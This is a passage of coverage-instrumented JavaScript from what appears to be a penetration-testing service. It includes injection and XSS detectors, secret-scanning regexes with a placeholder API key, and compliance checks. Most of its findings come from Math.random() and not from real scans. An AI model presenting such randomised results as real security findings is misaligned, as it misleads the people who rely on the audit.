        (cov_20fguhnp3o().b[67][1]++, 'LOW'),
        description: 'Tests network security through penetration testing',
        findings,
        recommendations: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[68][0]++, ['Close unnecessary ports', 'Implement network segmentation', 'Use firewalls and access controls']) :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[68][1]++, []),
        timestamp: new Date(),
        executionTime: Date.now() - startTime
      };
    } catch (error) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[223]++;
      this.logger.error('Network penetration test failed', {
        error
      });
      /* istanbul ignore next */
      cov_20fguhnp3o().s[224]++;
      return this.createErrorTestResult(testId, 'Network Penetration Test', error);
    }
  }
  /**
   * Run application penetration test
   */
  async runApplicationPenetrationTest() {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[30]++;
    const startTime =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[225]++, Date.now());
    const testId =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[226]++, crypto.randomUUID());
    const findings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[227]++, []);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[228]++;
    try {
      // Business logic testing
      const logicFlaws =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[229]++, await this.testBusinessLogicFlaws());
      /* istanbul ignore next */
      cov_20fguhnp3o().s[230]++;
      findings.push(...logicFlaws);
      // Session management testing
      const sessionFlaws =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[231]++, await this.testSessionManagement());
      /* istanbul ignore next */
      cov_20fguhnp3o().s[232]++;
      findings.push(...sessionFlaws);
      /* istanbul ignore next */
      cov_20fguhnp3o().s[233]++;
      return {
        testId,
        testName: 'Application Penetration Test',
        category: 'PENETRATION',
        status: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[69][0]++, 'FAIL') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[69][1]++, 'PASS'),
        severity: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[70][0]++, 'HIGH') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[70][1]++, 'LOW'),
        description: 'Tests application security through penetration testing',
        findings,
        recommendations: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[71][0]++, ['Fix business logic flaws', 'Implement secure session management', 'Add comprehensive security testing']) :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[71][1]++, []),
        timestamp: new Date(),
        executionTime: Date.now() - startTime
      };
    } catch (error) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[234]++;
      this.logger.error('Application penetration test failed', {
        error
      });
      /* istanbul ignore next */
      cov_20fguhnp3o().s[235]++;
      return this.createErrorTestResult(testId, 'Application Penetration Test', error);
    }
  }
  /**
   * Run social engineering test
   */
  async runSocialEngineeringTest() {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[31]++;
    const startTime =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[236]++, Date.now());
    const testId =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[237]++, crypto.randomUUID());
    const findings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[238]++, []);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[239]++;
    try {
      // This would be a simulated test in a real environment
      // For now, we'll check for common social engineering vulnerabilities
      const socialEngVulns =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[240]++, await this.checkSocialEngineeringVulnerabilities());
      /* istanbul ignore next */
      cov_20fguhnp3o().s[241]++;
      findings.push(...socialEngVulns);
      /* istanbul ignore next */
      cov_20fguhnp3o().s[242]++;
      return {
        testId,
        testName: 'Social Engineering Test',
        category: 'PENETRATION',
        status: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[72][0]++, 'FAIL') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[72][1]++, 'PASS'),
        severity: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[73][0]++, 'MEDIUM') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[73][1]++, 'LOW'),
        description: 'Tests for social engineering vulnerabilities',
        findings,
        recommendations: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[74][0]++, ['Implement security awareness training', 'Add multi-factor authentication', 'Create incident response procedures']) :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[74][1]++, []),
        timestamp: new Date(),
        executionTime: Date.now() - startTime
      };
    } catch (error) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[243]++;
      this.logger.error('Social engineering test failed', {
        error
      });
      /* istanbul ignore next */
      cov_20fguhnp3o().s[244]++;
      return this.createErrorTestResult(testId, 'Social Engineering Test', error);
    }
  }
  // Helper methods for testing
  async sendTestRequest(endpoint, data =
  /* istanbul ignore next */
  (cov_20fguhnp3o().b[75][0]++, {}), headers =
  /* istanbul ignore next */
  (cov_20fguhnp3o().b[76][0]++, {})) {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[32]++;
    cov_20fguhnp3o().s[245]++;
    try {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[246]++;
      return await axios_1.default.post(endpoint, data, {
        headers,
        timeout: this.config.timeoutMs,
        validateStatus: () => {
          /* istanbul ignore next */
          cov_20fguhnp3o().f[33]++;
          cov_20fguhnp3o().s[247]++;
          return true;
        } // Don't throw on HTTP errors
      });
    } catch (error) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[248]++;
      return {
        status:
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[77][0]++, error.response?.status) ||
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[77][1]++, 0),
        data:
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[78][0]++, error.response?.data) ||
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[78][1]++, ''),
        headers:
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[79][0]++, error.response?.headers) ||
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[79][1]++, {})
      };
    }
  }
  detectSQLInjectionVulnerability(response) {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[34]++;
    const indicators =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[249]++, ['SQL syntax error', 'mysql_fetch_array', 'ORA-00933', 'Microsoft OLE DB Provider', 'unclosed quotation mark']);
    const responseText =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[250]++,
    /* istanbul ignore next */
    (cov_20fguhnp3o().b[80][0]++, response.data?.toString().toLowerCase()) ||
    /* istanbul ignore next */
    (cov_20fguhnp3o().b[80][1]++, ''));
    /* istanbul ignore next */
    cov_20fguhnp3o().s[251]++;
    return indicators.some(indicator => {
      /* istanbul ignore next */
      cov_20fguhnp3o().f[35]++;
      cov_20fguhnp3o().s[252]++;
      return responseText.includes(indicator.toLowerCase());
    });
  }
  detectXSSVulnerability(response, payload) {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[36]++;
    const responseText =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[253]++,
    /* istanbul ignore next */
    (cov_20fguhnp3o().b[81][0]++, response.data?.toString()) ||
    /* istanbul ignore next */
    (cov_20fguhnp3o().b[81][1]++, ''));
    /* istanbul ignore next */
    cov_20fguhnp3o().s[254]++;
    return /* istanbul ignore next */(cov_20fguhnp3o().b[82][0]++, responseText.includes(payload)) &&
    /* istanbul ignore next */
    (cov_20fguhnp3o().b[82][1]++, !responseText.includes('&lt;script&gt;'));
  }
  detectInputValidationIssue(response) {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[37]++;
    const errorIndicators =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[255]++, ['stack trace', 'internal server error', 'exception', 'error 500']);
    const responseText =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[256]++,
    /* istanbul ignore next */
    (cov_20fguhnp3o().b[83][0]++, response.data?.toString().toLowerCase()) ||
    /* istanbul ignore next */
    (cov_20fguhnp3o().b[83][1]++, ''));
    /* istanbul ignore next */
    cov_20fguhnp3o().s[257]++;
    return errorIndicators.some(indicator => {
      /* istanbul ignore next */
      cov_20fguhnp3o().f[38]++;
      cov_20fguhnp3o().s[258]++;
      return responseText.includes(indicator);
    });
  }
  isVulnerablePackage(pkg, version) {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[39]++;
    // This would integrate with vulnerability databases
    // For simulation, we'll flag some common vulnerable patterns
    const vulnerablePatterns =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[259]++, [{
      name: 'lodash',
      versions: ['4.17.20', '4.17.19']
    }, {
      name: 'axios',
      versions: ['0.21.0']
    }, {
      name: 'express',
      versions: ['4.17.0']
    }]);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[260]++;
    return vulnerablePatterns.some(pattern => {
      /* istanbul ignore next */
      cov_20fguhnp3o().f[40]++;
      cov_20fguhnp3o().s[261]++;
      return /* istanbul ignore next */(cov_20fguhnp3o().b[84][0]++, pattern.name === pkg) &&
      /* istanbul ignore next */
      (cov_20fguhnp3o().b[84][1]++, pattern.versions.includes(version));
    });
  }
  async scanForHardcodedSecrets(file) {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[41]++;
    const findings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[262]++, []);
    // This would scan actual files for secrets
    // For simulation, we'll create sample findings
    const secretPatterns =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[263]++, [/password\s*=\s*["'][^"']+["']/i, /api_key\s*=\s*["'][^"']+["']/i, /secret\s*=\s*["'][^"']+["']/i]);
    // Simulate finding hardcoded secrets
    /* istanbul ignore next */
    cov_20fguhnp3o().s[264]++;
    if (
    /* istanbul ignore next */
    (cov_20fguhnp3o().b[86][0]++, file.includes('.env')) &&
    /* istanbul ignore next */
    (cov_20fguhnp3o().b[86][1]++, Math.random() > 0.8)) {
      /* istanbul ignore next */
      cov_20fguhnp3o().b[85][0]++;
      cov_20fguhnp3o().s[265]++;
      findings.push({
        id: crypto.randomUUID(),
        type: 'HARDCODED_SECRET',
        severity: 'CRITICAL',
        description: 'Hardcoded secret detected in configuration file',
        location: file,
        evidence: 'API_KEY=sk-1234567890abcdef',
        remediation: 'Use environment variables for secrets'
      });
    } else
    /* istanbul ignore next */
    {
      cov_20fguhnp3o().b[85][1]++;
    }
    cov_20fguhnp3o().s[266]++;
    return findings;
  }
  async scanForInsecureConfigurations() {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[42]++;
    const findings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[267]++, []);
    // Check for common insecure configurations
    const insecureConfigs =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[268]++, [{
      key: 'DEBUG',
      value: 'true',
      severity: 'MEDIUM'
    }, {
      key: 'SSL_VERIFY',
      value: 'false',
      severity: 'HIGH'
    }, {
      key: 'CORS_ORIGIN',
      value: '*',
      severity: 'MEDIUM'
    }]);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[269]++;
    for (const config of insecureConfigs) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[270]++;
      findings.push({
        id: crypto.randomUUID(),
        type: 'INSECURE_CONFIG',
        severity: config.severity,
        description: `Insecure configuration: ${config.key}=${config.value}`,
        location: 'Configuration',
        evidence: `${config.key}=${config.value}`,
        remediation: `Secure the ${config.key} configuration`
      });
    }
    /* istanbul ignore next */
    cov_20fguhnp3o().s[271]++;
    return findings;
  }
  async scanFilePermissions() {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[43]++;
    const findings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[272]++, []);
    // This would check actual file permissions
    // For simulation, we'll create sample findings
    const riskyFiles =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[273]++, ['.env', 'private.key', 'config.json']);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[274]++;
    for (const file of riskyFiles) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[275]++;
      if (Math.random() > 0.7) {
        /* istanbul ignore next */
        cov_20fguhnp3o().b[87][0]++;
        cov_20fguhnp3o().s[276]++;
        findings.push({
          id: crypto.randomUUID(),
          type: 'FILE_PERMISSIONS',
          severity: 'MEDIUM',
          description: `File ${file} has overly permissive permissions`,
          location: file,
          evidence: 'File permissions: 644 (should be 600)',
          remediation: `Change permissions of ${file} to 600`
        });
      } else
      /* istanbul ignore next */
      {
        cov_20fguhnp3o().b[87][1]++;
      }
    }
    /* istanbul ignore next */
    cov_20fguhnp3o().s[277]++;
    return findings;
  }
  async scanForSensitiveFiles() {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[44]++;
    const findings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[278]++, []);
    const sensitiveFiles =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[279]++, ['.git/config', 'backup.sql', 'debug.log', '.DS_Store']);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[280]++;
    for (const file of sensitiveFiles) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[281]++;
      if (Math.random() > 0.8) {
        /* istanbul ignore next */
        cov_20fguhnp3o().b[88][0]++;
        cov_20fguhnp3o().s[282]++;
        findings.push({
          id: crypto.randomUUID(),
          type: 'SENSITIVE_FILE',
          severity: 'LOW',
          description: `Sensitive file detected: ${file}`,
          location: file,
          evidence: `File ${file} contains sensitive information`,
          remediation: `Remove or secure ${file}`
        });
      } else
      /* istanbul ignore next */
      {
        cov_20fguhnp3o().b[88][1]++;
      }
    }
    /* istanbul ignore next */
    cov_20fguhnp3o().s[283]++;
    return findings;
  }
  async checkOWASPCompliance() {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[45]++;
    const findings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[284]++, []);
    // Check OWASP Top 10 compliance
    const owaspChecks =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[285]++, ['Injection vulnerabilities', 'Broken authentication', 'Sensitive data exposure', 'XML external entities', 'Broken access control']);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[286]++;
    for (const check of owaspChecks) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[287]++;
      if (Math.random() > 0.6) {
        /* istanbul ignore next */
        cov_20fguhnp3o().b[89][0]++;
        cov_20fguhnp3o().s[288]++;
        findings.push({
          id: crypto.randomUUID(),
          type: 'OWASP_COMPLIANCE',
          severity: 'HIGH',
          description: `OWASP compliance issue: ${check}`,
          location: 'Application',
          evidence: `${check} not properly addressed`,
          remediation: `Implement controls for ${check}`
        });
      } else
      /* istanbul ignore next */
      {
        cov_20fguhnp3o().b[89][1]++;
      }
    }
    /* istanbul ignore next */
    cov_20fguhnp3o().s[289]++;
    return findings;
  }
  async checkISO27001Compliance() {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[46]++;
    const findings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[290]++, []);
    // Check ISO 27001 compliance
    const iso27001Checks =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[291]++, ['Access control policy', 'Incident management', 'Risk assessment', 'Security monitoring']);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[292]++;
    for (const check of iso27001Checks) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[293]++;
      if (Math.random() > 0.7) {
        /* istanbul ignore next */
        cov_20fguhnp3o().b[90][0]++;
        cov_20fguhnp3o().s[294]++;
        findings.push({
          id: crypto.randomUUID(),
          type: 'ISO27001_COMPLIANCE',
          severity: 'MEDIUM',
          description: `ISO 27001 compliance gap: ${check}`,
          location: 'Security Management',
          evidence: `${check} not documented or implemented`,
          remediation: `Implement and document ${check}`
        });
      } else
      /* istanbul ignore next */
      {
        cov_20fguhnp3o().b[90][1]++;
      }
    }
    /* istanbul ignore next */
    cov_20fguhnp3o().s[295]++;
    return findings;
  }
  async checkSOC2Compliance() {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[47]++;
    const findings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[296]++, []);
    // Check SOC 2 compliance
    const soc2Checks =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[297]++, ['Security controls', 'Availability controls', 'Processing integrity', 'Confidentiality controls']);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[298]++;
    for (const check of soc2Checks) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[299]++;
      if (Math.random() > 0.8) {
        /* istanbul ignore next */
        cov_20fguhnp3o().b[91][0]++;
        cov_20fguhnp3o().s[300]++;
        findings.push({
          id: crypto.randomUUID(),
          type: 'SOC2_COMPLIANCE',
          severity: 'MEDIUM',
          description: `SOC 2 compliance issue: ${check}`,
          location: 'Compliance Framework',
          evidence: `${check} not adequately implemented`,
          remediation: `Strengthen ${check} implementation`
        });
      } else
      /* istanbul ignore next */
      {
        cov_20fguhnp3o().b[91][1]++;
      }
    }
    /* istanbul ignore next */
    cov_20fguhnp3o().s[301]++;
    return findings;
  }
  async scanOpenPorts() {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[48]++;
    cov_20fguhnp3o().s[302]++;
    // This would perform actual port scanning
    // For simulation, return common ports
    return [22, 80, 443, 3000, 5432, 6379];
  }
  isUnnecessaryPort(port) {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[49]++;
    const necessaryPorts =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[303]++, [22, 80, 443]); // SSH, HTTP, HTTPS
    /* istanbul ignore next */
    cov_20fguhnp3o().s[304]++;
    return !necessaryPorts.includes(port);
  }
  async testBusinessLogicFlaws() {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[50]++;
    const findings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[305]++, []);
    // Simulate business logic testing
    const logicFlaws =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[306]++, ['Price manipulation vulnerability', 'Race condition in order processing', 'Insufficient authorization checks']);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[307]++;
    for (const flaw of logicFlaws) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[308]++;
      if (Math.random() > 0.8) {
        /* istanbul ignore next */
        cov_20fguhnp3o().b[92][0]++;
        cov_20fguhnp3o().s[309]++;
        findings.push({
          id: crypto.randomUUID(),
          type: 'BUSINESS_LOGIC',
          severity: 'HIGH',
          description: `Business logic flaw: ${flaw}`,
          location: 'Application Logic',
          evidence: `${flaw} detected during testing`,
          remediation: `Fix ${flaw} in application logic`
        });
      } else
      /* istanbul ignore next */
      {
        cov_20fguhnp3o().b[92][1]++;
      }
    }
    /* istanbul ignore next */
    cov_20fguhnp3o().s[310]++;
    return findings;
  }
  async testSessionManagement() {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[51]++;
    const findings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[311]++, []);
    // Simulate session management testing
    const sessionIssues =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[312]++, ['Session fixation vulnerability', 'Insufficient session timeout', 'Weak session token generation']);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[313]++;
    for (const issue of sessionIssues) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[314]++;
      if (Math.random() > 0.7) {
        /* istanbul ignore next */
        cov_20fguhnp3o().b[93][0]++;
        cov_20fguhnp3o().s[315]++;
        findings.push({
          id: crypto.randomUUID(),
          type: 'SESSION_MANAGEMENT',
          severity: 'MEDIUM',
          description: `Session management issue: ${issue}`,
          location: 'Session Management',
          evidence: `${issue} detected`,
          remediation: `Fix ${issue} in session handling`
        });
      } else
      /* istanbul ignore next */
      {
        cov_20fguhnp3o().b[93][1]++;
      }
    }
    /* istanbul ignore next */
    cov_20fguhnp3o().s[316]++;
    return findings;
  }
  async checkSocialEngineeringVulnerabilities() {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[52]++;
    const findings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[317]++, []);
    // Check for social engineering vulnerabilities
    const socialEngVulns =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[318]++, ['No security awareness training', 'Weak password policies', 'No multi-factor authentication']);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[319]++;
    for (const vuln of socialEngVulns) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[320]++;
      if (Math.random() > 0.6) {
        /* istanbul ignore next */
        cov_20fguhnp3o().b[94][0]++;
        cov_20fguhnp3o().s[321]++;
        findings.push({
          id: crypto.randomUUID(),
          type: 'SOCIAL_ENGINEERING',
          severity: 'MEDIUM',
          description: `Social engineering vulnerability: ${vuln}`,
          location: 'Human Factors',
          evidence: `${vuln} increases social engineering risk`,
          remediation: `Address ${vuln} through policy and training`
        });
      } else
      /* istanbul ignore next */
      {
        cov_20fguhnp3o().b[94][1]++;
      }
    }
    /* istanbul ignore next */
    cov_20fguhnp3o().s[322]++;
    return findings;
  }
  generateVulnerabilityReport(results) {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[53]++;
    const allFindings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[323]++, results.flatMap(r => {
      /* istanbul ignore next */
      cov_20fguhnp3o().f[54]++;
      cov_20fguhnp3o().s[324]++;
      return r.findings;
    }));
    const criticalCount =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[325]++, allFindings.filter(f => {
      /* istanbul ignore next */
      cov_20fguhnp3o().f[55]++;
      cov_20fguhnp3o().s[326]++;
      return f.severity === 'CRITICAL';
    }).length);
    const highCount =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[327]++, allFindings.filter(f => {
      /* istanbul ignore next */
      cov_20fguhnp3o().f[56]++;
      cov_20fguhnp3o().s[328]++;
      return f.severity === 'HIGH';
    }).length);
    const mediumCount =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[329]++, allFindings.filter(f => {
      /* istanbul ignore next */
      cov_20fguhnp3o().f[57]++;
      cov_20fguhnp3o().s[330]++;
      return f.severity === 'MEDIUM';
    }).length);
    const lowCount =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[331]++, allFindings.filter(f => {
      /* istanbul ignore next */
      cov_20fguhnp3o().f[58]++;
      cov_20fguhnp3o().s[332]++;
      return f.severity === 'LOW';
    }).length);
    // Calculate compliance score (0-100)
    const totalTests =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[333]++, results.length);
    const passedTests =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[334]++, results.filter(r => {
      /* istanbul ignore next */
      cov_20fguhnp3o().f[59]++;
      cov_20fguhnp3o().s[335]++;
      return r.status === 'PASS';
    }).length);
    const complianceScore =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[336]++, Math.round(passedTests / totalTests * 100));
    const recommendations =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[337]++, [...new Set(results.flatMap(r => {
      /* istanbul ignore next */
      cov_20fguhnp3o().f[60]++;
      cov_20fguhnp3o().s[338]++;
      return r.recommendations;
    }))]);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[339]++;
    return {
      scanId: crypto.randomUUID(),
      timestamp: new Date(),
      totalVulnerabilities: allFindings.length,
      criticalCount,
      highCount,
      mediumCount,
      lowCount,
      vulnerabilities: allFindings,
      complianceScore,
      recommendations
    };
  }
  createErrorTestResult(testId, testName, error) {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[61]++;
    cov_20fguhnp3o().s[340]++;
    return {
      testId,
      testName,
      category: 'API_SECURITY',
      status: 'FAIL',
      severity: 'HIGH',
      description: `Test failed due to error: ${error.message}`,
      findings: [{
        id: crypto.randomUUID(),
        type: 'TEST_ERROR',
        severity: 'HIGH',
        description: `Test execution failed: ${error.message}`,
        location: 'Test Framework',
        evidence:
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[95][0]++, error.stack) ||
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[95][1]++, error.message),
        remediation: 'Fix test execution error and retry'
      }],
      recommendations: ['Fix test execution error', 'Review test configuration'],
      timestamp: new Date(),
      executionTime: 0
    };
  }
  /**
   * Get test results
   */
  getTestResults() {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[62]++;
    cov_20fguhnp3o().s[341]++;
    return [...this.testResults];
  }
  /**
   * Clear test results
   */
  clearTestResults() {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[63]++;
    cov_20fguhnp3o().s[342]++;
    this.testResults = [];
  }
}
/* istanbul ignore next */
cov_20fguhnp3o().s[343]++;
exports.PenetrationTestingService = PenetrationTestingService;
//# sourceMappingURL=data:application/json;charset=utf-8;base64,